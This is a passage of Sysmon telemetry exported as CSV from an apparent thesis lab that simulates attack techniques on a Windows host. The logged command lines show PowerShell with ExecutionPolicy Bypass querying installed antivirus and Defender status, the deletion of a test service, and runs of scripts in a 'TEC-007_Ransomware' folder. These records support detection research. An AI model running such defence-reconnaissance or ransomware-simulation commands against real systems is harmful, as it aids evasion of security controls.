 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:24.6451394Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:12.218"",
 ""ProcessGuid"": ""{6bc49a7d-8d0c-6a53-9505-000000009a01}"",
 ""ProcessId"": 8444,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  delete \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d0c-6a53-9405-000000009a01}"",
 ""ParentProcessId"": ""11680"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe delete \""TFM TEC005 Test Service\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,13,2026-07-12T12:48:24.663754Z,"{
 ""RuleName"": ""T1031,T1050"",
 ""EventType"": ""SetValue"",
 ""UtcTime"": ""2026-07-12 12:48:12.245"",
 ""ProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ProcessId"": 772,
 ""Image"": ""C:\\Windows\\system32\\services.exe"",
 ""TargetObject"": ""HKLM\\System\\CurrentControlSet\\Services\\TFM TEC005 Test Service\\Start"",
 ""Details"": ""DWORD (0x00000004)"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,3,2026-07-12T12:48:34.4339141Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:48:44.901"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50641"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,3,2026-07-12T12:48:34.4339492Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:48:44.918"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50642"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:35.0740266Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:27.862"",
 ""ProcessGuid"": ""{6bc49a7d-8d1b-6a53-9605-000000009a01}"",
 ""ProcessId"": 2892,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:35.1056172Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:27.898"",
 ""ProcessGuid"": ""{6bc49a7d-8d1b-6a53-9705-000000009a01}"",
 ""ProcessId"": 8204,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \""Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d1b-6a53-9605-000000009a01}"",
 ""ParentProcessId"": ""2892"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:48:35.2743402Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:28.166"",
 ""ProcessGuid"": ""{6bc49a7d-8d1b-6a53-9705-000000009a01}"",
 ""ProcessId"": 8204,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_nx5fvnqk.qsq.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:48:28.166"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:37.8680689Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:32.055"",
 ""ProcessGuid"": ""{6bc49a7d-8d20-6a53-9805-000000009a01}"",
 ""ProcessId"": 9536,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c cmd.exe /c \""wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:37.9026127Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:32.091"",
 ""ProcessGuid"": ""{6bc49a7d-8d20-6a53-9905-000000009a01}"",
 ""ProcessId"": 6384,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""cmd.exe  /c \""wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d20-6a53-9805-000000009a01}"",
 ""ParentProcessId"": ""9536"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c cmd.exe /c \""wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:37.9209154Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:32.129"",
 ""ProcessGuid"": ""{6bc49a7d-8d20-6a53-9a05-000000009a01}"",
 ""ProcessId"": 8716,
 ""Image"": ""C:\\Windows\\System32\\wbem\\WMIC.exe"",
 ""FileVersion"": ""10.0.19041.1741 (WinBuild.160101.0800)"",
 ""Description"": ""WMI Commandline Utility"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""wmic.exe"",
 ""CommandLine"": ""wmic  /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=C37F2F4F4B3CD128BDABCAEB2266A785,SHA256=12ABB45620A7A1FFD8BB953DEBA3FCC30B8BA14B2FF523F1F519BF2BF6BA7D4C,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d20-6a53-9905-000000009a01}"",
 ""ParentProcessId"": ""6384"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""cmd.exe  /c \""wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:48.608903Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:48.161"",
 ""ProcessGuid"": ""{6bc49a7d-8d30-6a53-9b05-000000009a01}"",
 ""ProcessId"": 9684,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:48.6455997Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:48.202"",
 ""ProcessGuid"": ""{6bc49a7d-8d30-6a53-9c05-000000009a01}"",
 ""ProcessId"": 11304,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d30-6a53-9b05-000000009a01}"",
 ""ParentProcessId"": ""9684"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:48:48.8056977Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:48.457"",
 ""ProcessGuid"": ""{6bc49a7d-8d30-6a53-9c05-000000009a01}"",
 ""ProcessId"": 11304,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mzwkgnmi.bfs.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:48:48.457"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:04.3291585Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:10.274"",
 ""ProcessGuid"": ""{6bc49a7d-8d46-6a53-9e05-000000009a01}"",
 ""ProcessId"": 8424,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:04.4063546Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:10.342"",
 ""ProcessGuid"": ""{6bc49a7d-8d46-6a53-9f05-000000009a01}"",
 ""ProcessId"": 8752,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d46-6a53-9e05-000000009a01}"",
 ""ParentProcessId"": ""8424"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:04.7173543Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:10.791"",
 ""ProcessGuid"": ""{6bc49a7d-8d46-6a53-9f05-000000009a01}"",
 ""ProcessId"": 8752,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_3biswfa2.cbt.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:10.791"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:06.0431422Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:12.402"",
 ""ProcessGuid"": ""{6bc49a7d-8d48-6a53-a005-000000009a01}"",
 ""ProcessId"": 2116,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:06.0836438Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:12.442"",
 ""ProcessGuid"": ""{6bc49a7d-8d48-6a53-a105-000000009a01}"",
 ""ProcessId"": 11092,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d48-6a53-a005-000000009a01}"",
 ""ParentProcessId"": ""2116"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:06.2288744Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:12.628"",
 ""ProcessGuid"": ""{6bc49a7d-8d48-6a53-a105-000000009a01}"",
 ""ProcessId"": 11092,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pl2ld1rb.fpl.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:12.628"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:09.8626523Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:17.043"",
 ""ProcessGuid"": ""{6bc49a7d-8d4d-6a53-a205-000000009a01}"",
 ""ProcessId"": 1716,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:09.8936704Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:17.071"",
 ""ProcessGuid"": ""{6bc49a7d-8d4d-6a53-a305-000000009a01}"",
 ""ProcessId"": 1384,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
